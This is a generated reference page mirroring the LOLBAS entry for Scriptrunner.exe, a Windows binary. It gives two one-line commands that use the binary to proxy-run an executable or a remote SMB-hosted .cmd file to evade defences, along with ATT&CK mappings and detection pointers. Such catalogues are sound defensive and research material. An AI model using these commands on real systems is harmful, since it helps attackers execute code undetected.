---
title: "Scriptrunner.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/Scriptrunner.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Scriptrunner.yml"
build_date: "2026-04-27 18:39:01"
category: "OSBinaries"
aliases:
  - "Scriptrunner.exe"
functions:
  - "Execute"
attack_technique_ids:
  - "T1202"
  - "T1218"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Scriptrunner.exe

Execute binary through proxy binary to evade defensive counter measures

## Metadata

- Category: OSBinaries
- Created: 2018-05-25
- Author: Oddvar Moe
- Source Path: yml/OSBinaries/Scriptrunner.yml

## Paths

- `C:\Windows\System32\scriptrunner.exe`
- `C:\Windows\SysWOW64\scriptrunner.exe`

## Commands

### 1. Execute

Executes executable

```cmd
Scriptrunner.exe -appvscript {PATH:.exe}
```

- Use Case: Execute binary through proxy binary to evade defensive counter measures
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1202-indirect_command_execution|T1202]]

### 2. Execute

Executes cmd file from remote server

```cmd
ScriptRunner.exe -appvscript {PATH_SMB:.cmd}
```

- Use Case: Execute binary through proxy binary from external server to evade defensive counter measures
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_servu_susp_child_process.yml
- IOC: Scriptrunner.exe should not be in use unless App-v is deployed

## Resources

- {'Link': 'https://twitter.com/KyleHanslovan/status/914800377580503040'}
- {'Link': 'https://twitter.com/NickTyrer/status/914234924655312896'}
- {'Link': 'https://github.com/MoooKitty/Code-Execution'}

## Acknowledgements

- {'Person': 'Nick Tyrer', 'Handle': '@nicktyrer'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Scriptrunner.yml)
